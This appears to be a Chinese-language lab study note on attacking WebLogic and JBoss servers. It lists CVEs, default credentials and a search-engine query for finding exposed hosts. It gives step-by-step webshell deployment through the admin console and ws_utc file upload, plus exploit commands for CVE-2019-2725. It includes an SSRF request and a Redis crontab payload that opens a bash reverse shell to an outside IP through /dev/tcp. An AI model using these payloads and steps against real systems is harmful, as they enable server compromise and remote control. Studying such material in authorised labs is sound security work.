---
typora-root-url: ./image
---

# Weblogic漏洞

## 简介

基于JavaEE架构的中间件，Java应用服务器

## 特征

默认端口: 7001

控制后台: http://ip:7001/console

![特征界面](/../Weblogic_vuln/weblogic_weakpass.png)

## Weblogic 历史漏洞 

漏洞主要影响版本：

```txt
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.1
Weblogic 12.2.1.2
Weblogic 12.2.1.3
Weblogic 14.1.1.0
```

|      漏洞类型       |                           CVE编号                            |
| :-----------------: | :----------------------------------------------------------: |
|        SSRF         |                        CVE-2014-4210                         |
|    任意文件上传     |                        CVE-2018-2894                         |
| XML Decode 反序列化 |     CVE-2017-10271<br />CVE-2019-2725<br />CVE-2019-2729     |
|    Java反序列化     | CVE-2015-4852<br />CVE-2016-0638<br />CVE-2016-3510<br />CVE-2017-3248<br />CVE-2018-2628<br />CVE-2018-2893<br />CVE-2020-2890<br />CVE-2020-2555<br />CVE-2020-14645<br />CVE-2020-14756<br />CVE-2021-2109 |
|       弱口令        |                   Weblogic<br />Oracle@123                   |

## Weblogic 历史漏洞发现

1. 获取资产

   利用网络空间搜索引擎

   fofa: app="BEA-WebLogic-Server"

## 漏洞利用

### WeakPassword

- [WeakPass网站](https://cirt.net/passwords?criteria=weblogic)

- 管理后台路径：/console

- 上传webshell

  1. jar命令打包war包

     ```java
     jar -cvf xxx.war xxx.jsp
     //c: 创建新的jar文件
     //v: 显示输出信息
     //f: 指定jar文件名称
     //注意: 第一个文件是要生成的目标文件
     ```

  2. 上传war包

     1. 登陆后台

     2. 部署->安装->上载文件，之后全部选择下一步完成部署

        ![img](/../Weblogic_vuln/9e00d34c95a60a7800ddd71411b2debf.png)

        ![img](https://study-cdn2.yijinglab.com/guide-img/e5fdc29c-6ee6-40e9-b03e-18b6bb6e5b7f/7461ab3ec341760d32b1fb34e920cd98.png?_=1718955217099)

  3. 访问路径：`/xxx/xxx.jsp`

### SSRF

1. 漏洞位置：`/uddiexplorer/SearchPublicRegistries.jsp`

2. 漏洞发现

​	![img](/../Weblogic_vuln/33939bd0fd133bb10385c2ac229b4305.png)

​	![img](/../Weblogic_vuln/a24eb7c433b5761b76cf50f1ce5b22e9.png)	

```html
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: 192.168.81.111:7001
Content-Length: 170
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Origin: http://192.168.81.111:7001
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.81.111:7001/uddiexplorer/SearchPublicRegistries.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=2wxhmy4L25TQtqp0jYhf4TP26GPMvR2qmFmsBZ5HsLy2bXZ5sFTp!-1442615718; JSESSIONID=nfmnmy4fRM1QKd1V3nq4L1zJ3JCqGTJZvPpHnzhLmj7Gr78yrsBJ!-1442615718
Connection: close

operator=http%3A%2F%2F127.0.0.1:7001&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

3. 内网探测

   1. 随机访问一个端口回显：could not connect
   2. 非http协议：did not have a valid SOAP
   3. 不存活主机：No route to host

4. SSRF 攻击内网redis

   先在攻击机上开启监听

   ```bash
   nc -lvvp 4444
   ```

   payload：

   ```bash
   http://172.28.0.2:6379/test
   
   set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'bash -i >& /dev/tcp/124.71.45.28/4444 0>&1'\n\n\n\n"
   config set dir /etc/
   config set dbfilename crontab
   save
   ```

   对payload进行url编码后作为operator参数的值发送请求

### 任意文件上传

1. 位置：`Weblogic Web Service Test Page`页面，这个页面在开发模式下才会开启，正式上线后默认关闭

2. 影响范围

   ```txt
   10.3.6.0
   12.1.3.0
   12.2.1.2
   12.2.1.3
   ```

3. 页面位置

   ```url
   /ws_utc/config.do
   /ws_utc/begin.do
   ```

   启用方法：控制台->base_donaim->高级->启用Web服务测试页->保存

   能访问到如下页面说明存在漏洞

   ![image-20240721205535835](/../Weblogic_vuln/image-20240721205535835.png)

   先在`/ws_utc/config.do`页面中设置`Work Home Dir`为

   ```url
   /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
   ```

   点击安全->添加，在keystore文件处上传，响应中的时间戳是webshell名称前缀

   上传jsp格式的webshell或者木马

### 反序列化漏洞--远程代码执行

1. 影响版本

   ```txt
   10.*
   12.1.3
   ```

2. 影响组件

   ```txt
   bea_wls9_async_response.war
   wsat.war
   ```

3. 漏洞识别

   访问路径`_async/AsyncResponseService`判断对应组件是否开启

4. 漏洞利用

   [漏洞利用脚本](https://gitee.com/yijingsec/CVE-2019-2725)

   ```bash
   # 利用漏洞执行命令
   python CVE-2019-2725.py 10.3.6 http://72262c7cbbcc.target.yijinglab.com whoami
   
   # 利用漏洞上传webshell
   python CVE-2019-2725.py 10.3.6 http://72262c7cbbcc.target.yijinglab.com
   ```


# JBoss漏洞

1. 默认页面

   ![image-20240721211740226](/../Weblogic_vuln/image-20240721211740226.png)

2. 漏洞检测脚本

   [jbossScan](https://github.com/GGyao/jbossScan)

   [jexboss](https://github.com/joaomatosf/jexboss)
